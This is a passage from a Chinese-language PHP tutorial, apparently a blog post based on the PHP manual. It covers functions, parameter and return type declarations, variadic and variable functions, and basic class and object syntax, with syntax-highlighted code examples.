class="line">foo();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 现在可以调用bar()函数了，因为foo()函数</span></span><br><span class="line"><span class="comment">   的执行使得bar()函数变为已定义的函数 */</span></span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a><strong>递归函数</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">recursion</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($a &lt; <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$a\n"</span>;</span><br><span class="line">        recursion($a + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Note</strong>: 但是要避免递归函数／方法调用超过 100-200 层，因为可能会使堆栈崩溃从而使当前脚本终止。 无限递归可视为编程错误。</p>
</blockquote>
<h3 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h3><p>注意当使用默认参数时，任何默认参数必须放在任何非默认参数的右侧；否则，函数将不会按照预期的情况工作。考虑下面的代码片断：</p>
<p><strong>函数默认参数的不正确用法</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeyogurt</span><span class="params">($type = <span class="string">"acidophilus"</span>, $flavour)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Making a bowl of $type $flavour.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> makeyogurt(<span class="string">"raspberry"</span>);   <span class="comment">// won't work as expected</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上例程会输出：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Warning</span>: Missing argument <span class="number">2</span> <span class="keyword">in</span> <span class="keyword">call</span> <span class="keyword">to</span> makeyogurt() <span class="keyword">in</span> </span><br><span class="line">/usr/<span class="keyword">local</span>/etc/httpd/htdocs/phptest/functest.html <span class="keyword">on</span> <span class="type">line</span> <span class="number">41</span></span><br><span class="line">Making a bowl <span class="keyword">of</span> raspberry .</span><br></pre></td></tr></table></figure>

<p>正确用法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeyogurt</span><span class="params">($flavour, $type = <span class="string">"acidophilus"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Making a bowl of $type $flavour.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> makeyogurt(<span class="string">"raspberry"</span>);   <span class="comment">// works as expected</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="参数类型"><a href="#参数类型" class="headerlink" title="参数类型"></a>参数类型</h3><table>
<thead>
<tr>
<th align="left">type</th>
<th align="left">Description</th>
<th align="left">Minimum PHP version</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Class/interface name</td>
<td align="left">The parameter must be an <a href="https://www.php.net/manual/zh/language.operators.type.php" target="_blank" rel="noopener"><em>instanceof</em></a> the given class or interface name.</td>
<td align="left">PHP 5.0.0</td>
</tr>
<tr>
<td align="left"><em>self</em></td>
<td align="left">The parameter must be an <a href="https://www.php.net/manual/zh/language.operators.type.php" target="_blank" rel="noopener"><em>instanceof</em></a> the same class as the one the method is defined on. This can only be used on class and instance methods.</td>
<td align="left">PHP 5.0.0</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a></td>
<td align="left">The parameter must be an <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a>.</td>
<td align="left">PHP 5.1.0</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.callable.php" target="_blank" rel="noopener">callable</a></td>
<td align="left">The parameter must be a valid <a href="https://www.php.net/manual/zh/language.types.callable.php" target="_blank" rel="noopener">callable</a>.</td>
<td align="left">PHP 5.4.0</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">bool</a></td>
<td align="left">The parameter must be a <a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">boolean</a> value.</td>
<td align="left">PHP 7.0.0</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a></td>
<td align="left">The parameter must be a <a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a>ing point number.</td>
<td align="left">PHP 7.0.0</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">int</a></td>
<td align="left">The parameter must be an <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a>.</td>
<td align="left">PHP 7.0.0</td>
</tr>
<tr>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td>
<td align="left">The parameter must be a <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>.</td>
<td align="left">PHP 7.0.0</td>
</tr>
<tr>
<td align="left"><em>iterable</em></td>
<td align="left">The parameter must be either an <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a> or an <a href="https://www.php.net/manual/zh/language.operators.type.php" target="_blank" rel="noopener"><em>instanceof</em></a> <strong>Traversable</strong>.</td>
<td align="left">PHP 7.1.0</td>
</tr>
<tr>
<td align="left"><em>object</em></td>
<td align="left">The parameter must be an <a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a>.</td>
<td align="left">PHP 7.2.0</td>
</tr>
</tbody></table>
<p><strong>Nullable type declaration</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span><span class="params">(C $c = null)</span> </span>&#123;</span><br><span class="line">    var_dump($c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="keyword">new</span> C);</span><br><span class="line">f(<span class="keyword">null</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="严格类型"><a href="#严格类型" class="headerlink" title="严格类型"></a>严格类型</h4><p>默认情况下，如果能做到的话，PHP将会强迫错误类型的值转为函数期望的标量类型。 例如，一个函数的一个参数期望是<a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>，但传入的是<a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a>，最终函数得到的将会是一个<a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>类型的值。</p>
<p>可以基于每一个文件开启严格模式。在严格模式中，只有一个与类型声明完全相符的变量才会被接受，否则将会抛出一个<strong>TypeError</strong>。 唯一的一个例外是可以将<a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a>传给一个期望<a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a>的函数。</p>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span><span class="params">(int $a, int $b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $a + $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    var_dump(sum(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">    var_dump(sum(<span class="number">1.5</span>, <span class="number">2.5</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (TypeError $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Error: '</span>.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int(3)</span></span><br><span class="line"><span class="comment">Error: Argument 1 passed to sum() must be of the type integer, float given, called in - on line 10</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h4 id="可变数量的参数列表"><a href="#可变数量的参数列表" class="headerlink" title="可变数量的参数列表"></a>可变数量的参数列表</h4><p>PHP 在用户自定义函数中支持可变数量的参数列表。在 PHP 5.6 及以上的版本中，由 <em>…</em> 语法实现；在 PHP 5.5 及更早版本中，使用函数 <a href="https://www.php.net/manual/zh/function.func-num-args.php" target="_blank" rel="noopener">func_num_args()</a>，<a href="https://www.php.net/manual/zh/function.func-get-arg.php" target="_blank" rel="noopener">func_get_arg()</a>，和 <a href="https://www.php.net/manual/zh/function.func-get-args.php" target="_blank" rel="noopener">func_get_args()</a> 。</p>
<p><em>…</em> in PHP 5.6+，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span><span class="params">(...$numbers)</span> </span>&#123;</span><br><span class="line">    $acc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($numbers <span class="keyword">as</span> $n) &#123;</span><br><span class="line">        $acc += $n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $acc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>也可以用…把list解压到参数列表中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $a + $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> add(...[<span class="number">1</span>, <span class="number">2</span>]).<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$a = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="keyword">echo</span> add(...$a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在老版本（低于5.5）时，不需要特殊语法标注可变，但是需要使用函数，例如： <a href="https://www.php.net/manual/zh/function.func-num-args.php" target="_blank" rel="noopener">func_num_args()</a>, <a href="https://www.php.net/manual/zh/function.func-get-arg.php" target="_blank" rel="noopener">func_get_arg()</a> 和 <a href="https://www.php.net/manual/zh/function.func-get-args.php" target="_blank" rel="noopener">func_get_args()</a>.</p>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $acc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (func_get_args() <span class="keyword">as</span> $n) &#123;</span><br><span class="line">        $acc += $n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $acc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>函数不能返回多个值，但可以通过返回一个数组来得到类似的效果。</p>
<p>从函数返回一个引用，必须在函数声明和指派返回值给一个变量时都使用引用运算符 &amp;。例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> &amp;<span class="title">returns_reference</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $someref;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$newref =&amp; returns_reference();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>PHP 7 增加了对返回值类型声明的支持。在默认的弱模式中，如果返回值与返回值的类型不一致，则会被强制转换为返回值声明的类型。在强模式中，返回值的类型必须正确，否则将会抛出一个<strong>TypeError</strong>异常。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span><span class="params">($a, $b)</span>: <span class="title">int</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $a + $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(sum(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">var_dump(sum(<span class="number">1</span>, <span class="number">2.5</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int(3)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Fatal error: Uncaught TypeError: Return value of sum() must be of the type integer, float returned in - on line 5 in -:5</span></span><br><span class="line"><span class="comment">Stack trace:</span></span><br><span class="line"><span class="comment">#0 -(9): sum(1, 2.5)</span></span><br><span class="line"><span class="comment">#1 &#123;main&#125;</span></span><br><span class="line"><span class="comment">  thrown in - on line 5</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>返回对象：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getC</span><span class="params">()</span>: <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(getC());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>返回null（PHP 7.1.0+）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_item</span><span class="params">()</span>: ?<span class="title">string</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'item'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> $_GET[<span class="string">'item'</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h3><p>一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Variable</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $name = <span class="string">'Bar'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$name(); <span class="comment">// This calls the Bar() method</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"This is Bar"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$foo = <span class="keyword">new</span> Foo();</span><br><span class="line">$funcname = <span class="string">"Variable"</span>;</span><br><span class="line">$foo-&gt;$funcname();   <span class="comment">// This calls $foo-&gt;Variable()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当调用静态方法时，函数调用要比静态属性优先。</p>
<p>调用数组和类中的方法，例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"bar\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">baz</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"baz\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$func = <span class="keyword">array</span>(<span class="string">"Foo"</span>, <span class="string">"bar"</span>);</span><br><span class="line">$func(); <span class="comment">// prints "bar"</span></span><br><span class="line">$func = <span class="keyword">array</span>(<span class="keyword">new</span> Foo, <span class="string">"baz"</span>);</span><br><span class="line">$func(); <span class="comment">// prints "baz"</span></span><br><span class="line">$func = <span class="string">"Foo::bar"</span>;</span><br><span class="line">$func(); <span class="comment">// prints "bar" as of PHP 7.0.0; prior, it raised a fatal error</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">版本</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">7.0.0</td>
<td align="left">‘ClassName::methodName’ is allowed as variable function.</td>
</tr>
<tr>
<td align="left">5.4.0</td>
<td align="left">Arrays, which are valid callables, are allowed as variable functions.</td>
</tr>
</tbody></table>
<h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h3><p>PHP手册中每一个函数的页面中都有关于函数参数、行为改变、成功与否的返回值以及使用条件等信息。了解这些重要的（常常是细微的）差别是编写正确的 PHP 代码的关键。</p>
<p>有时需要加载模块（和扩展模块一起编译）以使用模块中的函数。</p>
<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>也叫闭包函数。允许临时创建一个没有指定名称的函数。</p>
<h3 id="Arrow函数"><a href="#Arrow函数" class="headerlink" title="Arrow函数"></a>Arrow函数</h3><p>PHP 7.4之后新增的使匿名函数语法更简洁的函数。</p>
<h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="简单的类定义"><a href="#简单的类定义" class="headerlink" title="简单的类定义"></a>简单的类定义</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 声明属性</span></span><br><span class="line">    <span class="keyword">public</span> $var = <span class="string">'a default value'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当一个方法在类定义内部被调用时，有一个可用的伪变量 $this。$this 是一个到主叫对象的引用（通常是该方法所从属的对象，但如果是从第二个对象<a href="https://www.php.net/manual/zh/language.oop5.static.php" target="_blank" rel="noopener">静态</a>调用时也可能是另一个对象）。</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'$this is defined ('</span>;</span><br><span class="line">            <span class="keyword">echo</span> get_class(<span class="keyword">$this</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">")\n"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"\$this is not defined.\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        A::foo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line">$a-&gt;foo();</span><br><span class="line"></span><br><span class="line">A::foo();</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;bar();</span><br><span class="line"></span><br><span class="line">B::bar();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Output of the above example in PHP 5:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span> is defined (A)</span><br><span class="line"><span class="keyword">$this</span> is not defined.</span><br><span class="line"><span class="keyword">$this</span> is defined (B)</span><br><span class="line"><span class="keyword">$this</span> is not defined.</span><br></pre></td></tr></table></figure>

<p>Output of the above example in PHP 7:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span> is defined (A)</span><br><span class="line"><span class="keyword">$this</span> is not defined.</span><br><span class="line"><span class="keyword">$this</span> is not defined.</span><br><span class="line"><span class="keyword">$this</span> is not defined.</span><br></pre></td></tr></table></figure>

<h4 id="new"><a href="#new" class="headerlink" title="new"></a>new</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$instance = <span class="keyword">new</span> SimpleClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以这样做：</span></span><br><span class="line">$className = <span class="string">'Foo'</span>;</span><br><span class="line">$instance = <span class="keyword">new</span> $className(); <span class="comment">// Foo()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在类定义内部，可以用 <em>new self</em> 和 <em>new parent</em> 创建新对象。</p>
<p>当把一个对象已经创建的实例赋给一个新变量时，新变量会访问同一个实例，就和用该对象赋值一样。此行为和给函数传递入实例时一样。可以用<a href="https://www.php.net/manual/zh/language.oop5.cloning.php" target="_blank" rel="noopener">克隆</a>给一个已创建的对象建立一个新实例。</p>
<h4 id="对象赋值"><a href="#对象赋值" class="headerlink" title="对象赋值"></a>对象赋值</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$instance = <span class="keyword">new</span> SimpleClass();</span><br><span class="line"></span><br><span class="line">$assigned   =  $instance;</span><br><span class="line">$reference  =&amp; $instance;</span><br><span class="line"></span><br><span class="line">$instance-&gt;var = <span class="string">'$assigned will have this value'</span>;</span><br><span class="line"></span><br><span class="line">$instance = <span class="keyword">null</span>; <span class="comment">// $instance and $reference become null</span></span><br><span class="line"></span><br><span class="line">var_dump($instance);</span><br><span class="line">var_dump($reference);</span><br><span class="line">var_dump($assigned);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上例程会输出：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">NULL</span></span><br><span class="line">object(SimpleClass)<span class="comment">#1 (1) &#123;</span></span><br><span class="line">   [<span class="string">"var"</span>]=&gt;</span><br><span class="line">     string(<span class="number">30</span>) <span class="string">"$assigned will have this value"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PHP 5.4.0 起，可以通过一个表达式来访问新创建对象的成员：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> DateTime())-&gt;format(<span class="string">'Y'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上例程的输出类似于：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">2016</span></span><br></pre></td></tr></table></figure>

<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>类的变量成员叫做“属性”。</p>
<p>属性声明是由关键字 <em>public</em>，<em>protected</em> 或者 <em>private</em> 开头，然后跟一个普通的变量声明来组成。属性中的变量可以初始化，但是初始化的值必须是常数，这里的常数是指 PHP 脚本在编译阶段时就可以得到其值，而不依赖于运行时的信息才能求值。</p>
<p>为了向后兼容 PHP 4，PHP 5 声明属性依然可以直接使用关键字 <em>var</em> 来替代（或者附加于）<em>public</em>，<em>protected</em> 或 <em>private</em>。但是已不再需要 <em>var</em> 了。如果直接使用 <em>var</em> 声明属性，而没有用 <em>public</em>，<em>protected</em> 或 <em>private</em> 之一，PHP 5 会将其视为 <em>public</em>。</p>
<p>在类的成员方法里面，可以用 *-&gt;*（对象运算符）：$this-&gt;property（其中 <em>property</em> 是该属性名）这种方式来访问非静态属性。静态属性则是用 *::*（双冒号）：self::$property 来访问。更多静态属性与非静态属性的区别参见 <a href="https://www.php.net/manual/zh/language.oop5.static.php" target="_blank" rel="noopener">Static 关键字</a>。</p>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="comment">// 错误的属性声明</span></span><br><span class="line">   <span class="keyword">public</span> $var1 = <span class="string">'hello '</span> . <span class="string">'world'</span>;</span><br><span class="line">   <span class="keyword">public</span> $var2 = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">hello world</span></span><br><span class="line"><span class="string">EOD;</span></span><br><span class="line">   <span class="keyword">public</span> $var3 = <span class="number">1</span>+<span class="number">2</span>;</span><br><span class="line">   <span class="keyword">public</span> $var4 = <span class="keyword">self</span>::myStaticMethod();</span><br><span class="line">   <span class="keyword">public</span> $var5 = $myVar;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 正确的属性声明</span></span><br><span class="line">   <span class="keyword">public</span> $var6 = myConstant;</span><br><span class="line">   <span class="keyword">public</span> $var7 = <span class="keyword">array</span>(<span class="keyword">true</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//在 PHP 5.3.0 及之后，下面的声明也正确(newdoc)</span></span><br><span class="line">   <span class="keyword">public</span> $var8 = <span class="string">&lt;&lt;&lt;'EOD'</span></span><br><span class="line"><span class="string">hello world</span></span><br><span class="line"><span class="string">EOD;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="类常量"><a href="#类常量" class="headerlink" title="类常量"></a>类常量</h3><p>可以把在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用 $ 符号。</p>
<p>常量的值必须是一个定值，不能是变量，类属性，数学运算的结果或函数调用。</p>
<p>实例：</p>
